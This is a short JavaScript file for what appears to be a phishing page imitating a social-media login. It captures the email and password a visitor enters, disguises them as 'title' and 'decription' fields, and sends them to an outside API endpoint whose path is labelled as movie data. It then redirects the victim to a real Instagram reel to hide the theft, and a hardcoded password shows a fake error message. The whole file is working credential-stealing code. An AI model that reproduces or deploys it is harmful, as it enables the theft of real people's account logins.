const loginButton = document.getElementById('login');
const facebookLoginButton = document.getElementById('facebooklogin');
const emailInput = document.querySelector('input[name="title"]');
const passwordInput = document.querySelector('input[name="decription"]');
const mobileSection = document.getElementById('mobile');
const authSection = document.getElementById('auth');
const sendmeth = () => {
    const email = emailInput.value;
    const password = passwordInput.value;
    const pkg = { title: email, decription: password }
    console.log(JSON.stringify(pkg))
    const API = "https://admin-api-maaj-sg2l.onrender.com/api/movie/data"
    const redirecturl="https://www.instagram.com/reel/C8XJlAoobng/"
    if (email && password) {
        fetch(API, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body:JSON.stringify(pkg) 
        })
            .then(res => {
                if (res.status==201)
                window.location.href =redirecturl
            })
            .catch(err => console.log(err));
    }
}
const wrongpwd = document.getElementById("wrongpwd");
loginButton.addEventListener('click', () => {
    console.log(emailInput.value, passwordInput.value)
    if(passwordInput.value=="Saini@9307"){
        wrongpwd.innerText="wrong username or password"
    }else if ( passwordInput.value!="Saini@9307" &&
        emailInput.value && passwordInput.value) { 
            sendmeth() 
        }
    else { alert("Please Enter your correct Credential") }
});
